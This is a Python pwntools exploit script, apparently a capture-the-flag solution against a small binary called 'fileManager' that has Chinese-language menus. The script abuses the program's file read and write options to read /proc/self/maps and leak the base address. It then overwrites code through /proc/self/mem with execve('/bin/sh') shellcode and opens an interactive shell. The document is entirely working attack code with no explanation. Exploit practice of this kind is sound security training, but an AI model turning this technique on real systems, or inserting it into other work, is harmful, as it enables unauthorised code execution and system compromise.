#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.log_level = "debug"
context.os = "linux"
context.arch = "i386"

if sys.argv[1] == "l":
    io = process("./fileManager")
else:
    #  socat tcp-l:9999,fork exec:./fileManager
    io = remote("127.0.0.1", 9999)
    
def read(name, offset, length):
    io.sendlineafter("3. 退出\n", "1")
    io.sendlineafter("模块名称:", name)
    io.sendlineafter("查找模块偏移量:", str(offset))
    io.sendlineafter("模块读取大小:", str(length))
    io.recvuntil("模块内容")

def write(name, offset, length, content):
    io.sendlineafter("3. 退出\n", "2")
    io.sendlineafter("模块名称:", name)
    io.sendlineafter("写入模块偏移量:", str(offset))
    io.sendlineafter("模块写入大小:", str(length))
    io.sendlineafter("写入模块:", content)

def exp():
    io.sendlineafter("请登录FTP:", "m4x")
    read("/proc/self/maps", 0, 0x100)
    base_addr = int(io.recvuntil("-", drop = True), 16)
    info("base_addr -> 0x%x" % base_addr)
    address = base_addr + 0x1154
    shellcode = asm(shellcraft.execve("/bin/sh"))
    write("/proc/self/mem", address, 0x100, shellcode)

    io.interactive()
    io.close()

if __name__ == "__main__":
    exp()




